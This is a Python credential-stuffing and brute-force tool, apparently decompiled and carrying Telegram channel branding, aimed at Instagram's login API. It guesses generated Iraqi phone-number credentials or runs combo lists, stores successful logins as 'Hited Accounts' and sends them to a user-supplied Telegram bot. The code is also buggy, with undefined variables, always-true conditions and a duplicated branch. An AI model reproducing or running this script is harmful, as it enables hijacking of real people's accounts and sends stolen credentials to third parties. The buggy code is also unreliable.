# Decompiled By SHude
import os
from time import sleep
os.system("title " + " #SHude Was Here - @Y_U_56")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

url = "https://pastebin.com/raw/g8GQn6tr"

p = requests.get(url)

print("""

\033[1;32m━━━━━━━━━━━━━

<-.(`-')  (`-')  _<-.(`-') (`-')  _  (`-').-> 
 __( OO)  ( OO).-/ __( OO) (OO ).-/  ( OO)_   
'-'---.\ (,------.'-'. ,--./ ,---.  (_)--\_)  
| .-. (/  |  .---'|  .'   /| \ /`.\ /    _ /  
| '-' `.)(|  '--. |      /)'-'|_.' |\_..`--.  
| /`'.  | |  .--' |  .   '(|  .-.  |.-._)   \ 
| '--'  / |  `---.|  |\   \|  | |  |\       / 
`------'  `------'`--' '--'`--' `--' `-----'  

 By👉@Y_U_56

━━━━━━━━━━━━━

""")

PASSWORD = input("[+] Enter your password :  ")

  

if p.text.find(PASSWORD)>=0:

             print("True")

             #YOUR CODE

else:

             print("False")

             
import os

from time import sleep

clear = lambda : os.system('cls')
import os

from time import sleep

clear = lambda : os.system('cls')
clear()
os.system('color a')
def banner():
    print("""

\033[1;32m━━━━━━━━━━━━━

<-.(`-')  (`-')  _<-.(`-') (`-')  _  (`-').-> 
 __( OO)  ( OO).-/ __( OO) (OO ).-/  ( OO)_   
'-'---.\ (,------.'-'. ,--./ ,---.  (_)--\_)  
| .-. (/  |  .---'|  .'   /| \ /`.\ /    _ /  
| '-' `.)(|  '--. |      /)'-'|_.' |\_..`--.  
| /`'.  | |  .--' |  .   '(|  .-.  |.-._)   \ 
| '--'  / |  `---.|  |\   \|  | |  |\       / 
`------'  `------'`--' '--'`--' `--' `-----'  

 By👉@Y_U_56

━━━━━━━━━━━━━
""")
    print(""" WELOCOME TO TOOL SHudeCHANNEL""")
    sleep(0.50)
    print(""" WELOCOME To TOOL SHudeCHannel
 CHannel👉@SHudeCHannel

 CHRUP👉@SHudeGRUP
 """)

banner()
print("")
print("\n ")
h , b,s,block = 0,0,0,0
tele = input("[+] Send Hits To Telegram Y/N ?: ")
if "Y" in tele:
    id = input("[+] Enter Id telegram : ")
    bot = input("[+]𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𝐁𝐎𝐓  : ")
elif "y" in tele:
    id = input("[+] Enter Id telegram : ")
    bot = input("[+]𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𝐁𝐎𝐓  : ")
print("==========================")
ask = input("""[1] Check By Combo
[2] Check Auto Num:Num
==========================
[+] Please Select Mode : """)
if ask == "2":
   
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r                  [=] Hacked : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964750' + us
        pasw = '0750' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.1)  
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=\n\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n\n")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
elif ask =="2":
    clear()
    banner()
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    user = open("Users.txt","r").read().splitlines()  
    pasw = open("Pass.txt","r").read().splitlines()    
    for u in user:
        for p in pasw:    
            req = requests.session()
            log_head = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'}
            uid = str(uuid4())
            log_data = {
                'uuid': uid,
                'password': p,
                'username': u,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
            #print(r.text)
            if "logged_in_user" in r.text:
                  if "Y" or "y" in tele:
                    t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited\n\n[=] User : {u} \n[=] Pass : {p}\n\n")
         
                    open("Hited Accounts.txt","a").write(f"{u}:{p}\n")
                    h += 1
                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'challenge_required' in log.text:
                s += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
                open("Scure.txt","w").write(f"{user}:{pasw}\n")
            elif 'Please wait a few minutes' in log.text:
                block += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'Bad request' in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            else:
                b+=1    
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
#==================================================================
elif ask =="1":
    assk = input("[+] Enter File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.5)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜᴇʟʟᴏ Bekas ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ ʜᴀᴄᴋᴇᴅ ✅\n✹✹✹✹✹✹✹✹✹✹✹✹✹\n\n[=] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} \n\[=] 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {pasw}\n\n✹✹✹✹✹✹✹✹✹✹✹✹✹\nBy @bekashacker")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    

